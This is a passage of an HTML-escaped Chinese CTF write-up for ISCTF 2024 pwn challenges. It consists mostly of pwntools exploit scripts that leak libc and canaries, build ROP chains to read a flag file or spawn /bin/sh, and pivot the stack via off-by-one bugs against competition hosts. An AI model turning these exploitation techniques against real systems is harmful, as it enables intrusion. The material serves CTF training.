punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rpu     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;drop&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;uu32    &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;uu64    &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lic     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; uu64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;padding &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; length                   &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;Yhuan&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;Y&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lg      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; var_name                 &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; log&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;success&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; ：0x&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;globals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token format-spec&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;prl     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; var_name                 &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;debug   &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; command&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;               &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; gdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attach&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;it      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt;                          &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pl &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x1a0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; padding&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4E20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4E20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4012FC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# debug()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pl&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;you want to guess: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;srand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4E20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20001&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v7 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v7&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v7&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;it&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ret2orw&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ret2orw&#34;&gt;#&lt;/a&gt; ret2orw&lt;/h2&gt;
+&lt;p&gt;先泄露 libc，之后就是比较普通的 orw，直接放脚本了&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;&#39;&#39;&#39;
+huan_attack_pwn
+&#39;&#39;&#39;
+
+import sys
+from pwn import *
+# from LibcSearcher import *
+# from ctypes import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+binary = &#39;./ret2orw&#39;
+libc = &#39;./libc.so.6&#39;
+host, port = &amp;quot;27.25.151.12:36337&amp;quot;.split(&amp;quot;:&amp;quot;)
+
+print((&#39;\033[31;40mremote\033[0m: (y)\n&#39;
+    &#39;\033[32;40mprocess\033[0m: (n)&#39;))
+
+if sys.argv[1] == &#39;y&#39;:
+    r = remote(host, int(port))
+else:
+    r = process(binary)
+
+# r = gdb.debug(binary)
+# libc = cdll.LoadLibrary(libc)
+libc = ELF(libc)
+elf = ELF(binary)
+# srand = libc.srand(libc.time(0)) #设置种子
+
+default = 1
+se      = lambda data                     : r.send(data)
+sa      = lambda delim, data              : r.sendafter(delim, data)
+sl      = lambda data                     : r.sendline(data)
+sla     = lambda delim, data              : r.sendlineafter(delim, data)
+rc      = lambda numb=4096                : r.recv(numb)
+rl      = lambda time=default             : r.recvline(timeout=time)
+ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
+rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
+uu32    = lambda data                     : u32(data.ljust(4, b&#39;\0&#39;))
+uu64    = lambda data                     : u64(data.ljust(8, b&#39;\0&#39;))
+lic     = lambda data                     : uu64(ru(data)[-6:])
+padding = lambda length                   : b&#39;Yhuan&#39; * (length // 5) + b&#39;Y&#39; * (length % 5)
+lg      = lambda var_name                 : log.success(f&amp;quot;&amp;#123;var_name&amp;#125; ：0x&amp;#123;globals()[var_name]:x&amp;#125;&amp;quot;)
+prl     = lambda var_name                 : print(len(var_name))
+debug   = lambda command=&#39;&#39;               : gdb.attach(r,command)
+it      = lambda                          : r.interactive()
+
+pg = elf.got[&#39;puts&#39;]
+pp = elf.plt[&#39;puts&#39;]
+rdi = 0x4012CE
+ra = 0x4012F2
+
+pl = padding(0x20) + p64(0) + p64(rdi) + p64(pg) + p64(pp) + p64(ra)
+
+sla(&amp;quot;oh,what&#39;s this?\n&amp;quot;,pl)
+puts_addr = u64(rc(6).ljust(8,b&#39;\x00&#39;))
+lg(&#39;puts_addr&#39;)
+
+libc.address = puts_addr - libc.sym[&#39;puts&#39;]
+libc_address = libc.address 
+lg(&#39;libc_address&#39;)
+
+open_addr = libc.sym[&#39;open&#39;]
+sendfile = libc.sym[&#39;sendfile&#39;]
+write_addr = libc.sym[&#39;write&#39;]
+rsi = 0x000000000016333a + libc_address
+rdx = 0x00000000000904a9 + libc_address
+pl = padding(0x20) + p64(0)
+pl += p64(rsi) + p64(elf.bss()+0x200) + p64(elf.plt[&#39;read&#39;])
+pl += p64(rdi) + p64(elf.bss()+0x200) + p64(rsi) + p64(0) + p64(open_addr)
+pl += p64(rdi) + p64(3) + p64(rsi) + p64(elf.bss()+0x400) + p64(rdx) + p64(0x50) + p64(0) + p64(libc.sym[&#39;read&#39;])
+pl += p64(rdi) + p64(1) + p64(rsi) + p64(elf.bss()+0x400) + p64(rdx) + p64(0x50) + p64(0) +p64(write_addr)
+
+# debug()
+sa(&amp;quot;oh,what&#39;s this?\n&amp;quot;,pl.ljust(0x100,b&#39;\0&#39;))
+
+se(&#39;./flag\x00\x00&#39;)
+it()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;小蓝鲨stack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小蓝鲨stack&#34;&gt;#&lt;/a&gt; 小蓝鲨 stack&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;程序代码比较简单&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/10.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先通过 1 字节溢出地址，返回到 libc_call_main 处，使用 printf 泄露 libc 以及再次返回到 main。&lt;/p&gt;
+&lt;p&gt;然后打 ret2libc 即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;&#39;&#39;&#39;
+huan_attack_pwn
+&#39;&#39;&#39;
+
+import sys
+from pwn import *
+# from LibcSearcher import *
+# from ctypes import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+binary = &#39;./ezstack&#39;
+libc = &#39;./libc-2.31.so&#39;
+host, port = &amp;quot;27.25.151.12:24744&amp;quot;.split(&amp;quot;:&amp;quot;)
+
+print((&#39;\033[31;40mremote\033[0m: (y)\n&#39;
+    &#39;\033[32;40mprocess\033[0m: (n)&#39;))
+
+if sys.argv[1] == &#39;y&#39;:
+    r = remote(host, int(port))
+else:
+    r = process(binary)
+
+# r = gdb.debug(binary)
+# libc = cdll.LoadLibrary(libc)
+libc = ELF(libc)
+elf = ELF(binary)
+# srand = libc.srand(libc.time(0)) #设置种子
+
+default = 1
+se      = lambda data                     : r.send(data)
+sa      = lambda delim, data              : r.sendafter(delim, data)
+sl      = lambda data                     : r.sendline(data)
+sla     = lambda delim, data              : r.sendlineafter(delim, data)
+rc      = lambda numb=4096                : r.recv(numb)
+rl      = lambda time=default             : r.recvline(timeout=time)
+ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
+rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
+uu32    = lambda data                     : u32(data.ljust(4, b&#39;\0&#39;))
+uu64    = lambda data                     : u64(data.ljust(8, b&#39;\0&#39;))
+lic     = lambda data                     : uu64(ru(data)[-6:])
+padding = lambda length                   : b&#39;Yhuan&#39; * (length // 5) + b&#39;Y&#39; * (length % 5)
+lg      = lambda var_name                 : log.success(f&amp;quot;&amp;#123;var_name&amp;#125; ：0x&amp;#123;globals()[var_name]:x&amp;#125;&amp;quot;)
+prl     = lambda var_name                 : print(len(var_name))
+debug   = lambda command=&#39;&#39;               : gdb.attach(r,command)
+it      = lambda                          : r.interactive()
+pl = padding(0x20) + padding(8) + b&#39;\x10&#39;
+# debug()
+se(pl)
+
+ru(&#39;YhuanYhuanYhuanYhuanYhuanYhuanYYYhuanYYY&#39;)
+libcbase = u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x024010
+lg(&#39;libcbase&#39;)
+
+system = libcbase + libc.sym[&#39;system&#39;]
+binsh = libcbase + next(libc.search(b&#39;/bin/sh&#39;))
+rdi = 0x0000000000023b6a + libcbase
+lg(&#39;system&#39;)
+# pause()
+# sl(&#39;&#39;)
+pl = padding(0x20) + padding(8) + p64(rdi+1) + p64(rdi) + p64(binsh) + p64(system)
+se(pl)
+
+it()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/5.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0verf10w&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0verf10w&#34;&gt;#&lt;/a&gt; 0verf10w&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/11.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/12.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;scanf 有长溢出漏洞，printf 格式字符串泄露 canary，vuln 有 off by one 漏洞，在 stack 中，有留下 libc_call_main 的片段。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/13.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这个片段刚好，1/16 的 off by one 将栈迁移到即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;&#39;&#39;&#39;
+huan_attack_pwn
+&#39;&#39;&#39;
+
+import sys
+from pwn import *
+# from LibcSearcher import *
+# from ctypes import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+binary = &#39;./pwn&#39;
+libc = &#39;./libc.so.6&#39;
+host, port = &amp;quot;27.25.151.12:32559&amp;quot;.split(&amp;quot;:&amp;quot;)
+
+print((&#39;\033[31;40mremote\033[0m: (y)\n&#39;
+    &#39;\033[32;40mprocess\033[0m: (n)&#39;))
+
+if sys.argv[1] == &#39;y&#39;:
+    r = remote(host, int(port))
+else:
+    r = process(binary)
+
+# r = gdb.debug(binary)
+# libc = cdll.LoadLibrary(libc)
+libc = ELF(libc)
+elf = ELF(binary)
+# srand = libc.srand(libc.time(0)) #设置种子
+
+default = 1
+se      = lambda data                     : r.send(data)
+sa      = lambda delim, data              : r.sendafter(delim, data)
+sl      = lambda data                     : r.sendline(data)
+sla     = lambda delim, data              : r.sendlineafter(delim, data)
+rc      = lambda numb=4096                : r.recv(numb)
+rl      = lambda time=default             : r.recvline(timeout=time)
+ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
+rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
+uu32    = lambda data                     : u32(data.ljust(4, b&#39;\0&#39;))
+uu64    = lambda data                     : u64(data.ljust(8, b&#39;\0&#39;))
+lic     = lambda data                     : uu64(ru(data)[-6:])
+padding = lambda length                   : b&#39;Yhuan&#39; * (length // 5) + b&#39;Y&#39; * (length % 5)
+lg      = lambda var_name                 : log.success(f&amp;quot;&amp;#123;var_name&amp;#125; ：0x&amp;#123;globals()[var_name]:x&amp;#125;&amp;quot;)
+prl     = lambda var_name                 : print(len(var_name))
+debug   = lambda command=&#39;&#39;               : gdb.attach(r,command)
+it      = lambda                          : r.interactive()
+
+sl(b&#39;ab&#39;*0x4+b&amp;quot;%31$p&amp;quot;+b&#39;a&#39;*0x4+b&#39;%29$p&#39;+b&#39;\x00&#39;*7)
+ru(&amp;quot;Great, I&#39;ve decided to give you a gift!\n&amp;quot;)
+# debug()
+# 0x7ffff7c29e40
+se(b&#39;%9$p&#39;*3)
+ru(&amp;quot;abababab0x&amp;quot;)
+libcbase = int(rc(len(&#39;7ffff7c29e40&#39;)),16) - 128 - libc.sym[&#39;__libc_start_main&#39;]
+ru(&#39;0x&#39;)
+canary = int(rc(16),16)
+lg(&#39;libcbase&#39;)
+lg(&#39;canary&#39;)
+# pause()
+ru(&#39;again?????\n&#39;)
+pl = p64(0)*3 + p64(canary) + b&#39;\xf0&#39;
+# debug()
+sl(pl)
+
+system = libc.sym[&#39;system&#39;] + libcbase
+binsh = next(libc.search(b&#39;/bin/sh&#39;)) + libcbase
+rdi = libcbase + 0x000000000002a3e5
+lg(&#39;system&#39;)
+# pause()
+pl = padding(0x14-8) + p64(canary) +  p64(0) + p64(rdi+1) +  p64(rdi) + p64(binsh) + p64(system)
+sla(&#39;name before that?\n&#39;,pl)
+
+
+sla(&#39;gift!\n&#39;,&#39;1234&#39;)
+sla(&#39;again?????\n&#39;,&#39;1234&#39;)
+it()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/14.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
